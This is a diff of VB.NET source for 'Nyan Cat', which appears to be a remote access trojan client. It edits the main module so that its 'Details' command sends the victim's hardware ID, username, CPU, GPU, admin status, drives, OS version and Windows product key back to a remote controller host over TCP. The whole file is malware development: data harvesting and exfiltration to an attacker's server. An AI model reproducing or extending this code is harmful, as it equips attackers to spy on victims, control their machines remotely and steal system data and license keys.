@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on MAR./17/2018        ##
+'##        N Y A N   C A T  |||   Updated on MAR./18/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -34,8 +34,7 @@
 '##################################################################
 
 
-Imports System.IO
-Imports System.Threading
+Imports System.IO, System.Threading
 
 Public Class Main
     Public Shared C As New TCP
@@ -45,6 +44,7 @@ Public Class Main
     Public Shared Sub Main()
 
         Thread.Sleep(1000)
+
         Dim createdNew As Boolean
         Settings.NMT = New Mutex(True, Settings.MTX, createdNew)
         Try
@@ -183,7 +183,7 @@ Public Class Main
                     DEC.BeforeDec()
 
                 Case "Details"
-                    C.Send("Details" + SPL + ID.HWID + SPL + ID.UserName + SPL + Reflection.Assembly.GetExecutingAssembly.Location + SPL + ID.CPU + SPL + ID.GPU + SPL + ID.AmiAdmin + SPL + ID.MachineType + SPL + DateAndTime.Now + SPL + ID.ListDrivers + SPL + ID.LastReboot + SPL + Settings.HOST + " @ " + Settings.PORT.ToString)
+                    C.Send("Details" + SPL + ID.HWID + SPL + ID.UserName + SPL + Reflection.Assembly.GetExecutingAssembly.Location + SPL + ID.CPU + SPL + ID.GPU + SPL + ID.AmiAdmin + SPL + ID.MachineType + SPL + DateAndTime.Now + SPL + ID.ListDrivers + SPL + ID.LastReboot + SPL + TCP.MainHOST + " @ " + Settings.PORT.ToString + SPL + ID.MyOS + " " + ID.Bit + SPL + ID.WinKey)
 
             End Select
         Catch ex As Exception
